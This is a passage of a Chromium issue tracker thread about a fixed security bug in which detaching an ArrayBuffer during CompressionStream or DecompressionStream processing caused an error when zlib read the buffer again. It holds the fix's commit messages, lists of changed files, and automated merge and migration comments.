commit 895c73c58a7cecc5557cbf0ea49c5782f22dd1fc
Author: Adam Rice <ricea@chromium.org>
Date: Fri Dec 18 04:10:34 2020

Correctly handle detach during (de)compression

Sometimes CompressionStream and DecompressionStream enqueue multiple
output chunks for a single input chunk. When this happens, JavaScript
code can detach the input ArrayBuffer while the stream is processing it.
This will cause an error when zlib tries to read the buffer again
afterwards.

To prevent this, buffer output chunks until the entire input chunk has
been processed, and then enqueue them all at once.

(cherry picked from commit 4794770cf175e3bb9425c64a6d196e07392cd34d)

Bug: 1151298
Change-Id: I03fca26fc641d54b09067e3994b76ee8efca6839
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2567539
Commit-Queue: Adam Rice <ricea@chromium.org>
Reviewed-by: Yutaka Hirano <yhirano@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#833659}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2593791
Reviewed-by: Adam Rice <ricea@chromium.org>
Cr-Commit-Position: refs/branch-heads/4280@{#1903}
Cr-Branched-From: ea420fb963f9658c9969b6513c56b8f47efa1a2a-refs/heads/master@{#812852}

[add] https://crrev.com/895c73c58a7cecc5557cbf0ea49c5782f22dd1fc/third_party/blink/web_tests/external/wpt/compression/decompression-with-detach.tentative.any.js
[modify] https://crrev.com/895c73c58a7cecc5557cbf0ea49c5782f22dd1fc/third_party/blink/renderer/modules/compression/inflate_transformer.h
[modify] https://crrev.com/895c73c58a7cecc5557cbf0ea49c5782f22dd1fc/third_party/blink/renderer/modules/compression/deflate_transformer.cc
[add] https://crrev.com/895c73c58a7cecc5557cbf0ea49c5782f22dd1fc/third_party/blink/web_tests/external/wpt/compression/resources/concatenate-stream.js
[add] https://crrev.com/895c73c58a7cecc5557cbf0ea49c5782f22dd1fc/third_party/blink/web_tests/external/wpt/compression/compression-with-detach.tentative.any.js
[modify] https://crrev.com/895c73c58a7cecc5557cbf0ea49c5782f22dd1fc/third_party/blink/renderer/modules/compression/inflate_transformer.cc


### ad...@google.com (2021-01-05)

[Empty comment from Monorail migration]

### am...@google.com (2021-01-06)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-07)

[Empty comment from Monorail migration]

### ac...@chromium.org (2021-01-08)

[Empty comment from Monorail migration]

### ke...@google.com (2021-01-08)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2021-01-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/849437efa442be8b988ce6b2f7b0b07f2c54cfcd

commit 849437efa442be8b988ce6b2f7b0b07f2c54cfcd
Author: Adam Rice <ricea@chromium.org>
Date: Sat Jan 09 20:35:34 2021

Correctly handle detach during (de)compression

Sometimes CompressionStream and DecompressionStream enqueue multiple
output chunks for a single input chunk. When this happens, JavaScript
code can detach the input ArrayBuffer while the stream is processing it.
This will cause an error when zlib tries to read the buffer again
afterwards.

To prevent this, buffer output chunks until the entire input chunk has
been processed, and then enqueue them all at once.

(cherry picked from commit 4794770cf175e3bb9425c64a6d196e07392cd34d)

(cherry picked from commit 895c73c58a7cecc5557cbf0ea49c5782f22dd1fc)

Bug: 1151298
Change-Id: I03fca26fc641d54b09067e3994b76ee8efca6839
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2567539
Commit-Queue: Adam Rice <ricea@chromium.org>
Reviewed-by: Yutaka Hirano <yhirano@chromium.org>
Cr-Original-Original-Commit-Position: refs/heads/master@{#833659}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2593791
Reviewed-by: Adam Rice <ricea@chromium.org>
Cr-Original-Commit-Position: refs/branch-heads/4280@{#1903}
Cr-Original-Branched-From: ea420fb963f9658c9969b6513c56b8f47efa1a2a-refs/heads/master@{#812852}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2617100
Reviewed-by: Victor-Gabriel Savu <vsavu@google.com>
Commit-Queue: Achuith Bhandarkar <achuith@chromium.org>
Cr-Commit-Position: refs/branch-heads/4240@{#1507}
Cr-Branched-From: f297677702651916bbf65e59c0d4bbd4ce57d1ee-refs/heads/master@{#800218}

[add] https://crrev.com/849437efa442be8b988ce6b2f7b0b07f2c54cfcd/third_party/blink/web_tests/external/wpt/compression/decompression-with-detach.tentative.any.js
[modify] https://crrev.com/849437efa442be8b988ce6b2f7b0b07f2c54cfcd/third_party/blink/renderer/modules/compression/inflate_transformer.h
[modify] https://crrev.com/849437efa442be8b988ce6b2f7b0b07f2c54cfcd/third_party/blink/renderer/modules/compression/deflate_transformer.cc
[add] https://crrev.com/849437efa442be8b988ce6b2f7b0b07f2c54cfcd/third_party/blink/web_tests/external/wpt/compression/resources/concatenate-stream.js
[add] https://crrev.com/849437efa442be8b988ce6b2f7b0b07f2c54cfcd/third_party/blink/web_tests/external/wpt/compression/compression-with-detach.tentative.any.js
[modify] https://crrev.com/849437efa442be8b988ce6b2f7b0b07f2c54cfcd/third_party/blink/renderer/modules/compression/inflate_transformer.cc


### [Deleted User] (2021-01-12)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ja...@google.com (2021-01-15)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-15)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2021-01-15)

[Empty comment from Monorail migration]

### ja...@google.com (2021-01-19)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-21)

[Empty comment from Monorail migration]

### [Deleted User] (2021-03-16)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1151298?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>Network>StreamsAPI, Internals>Core]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053930)*
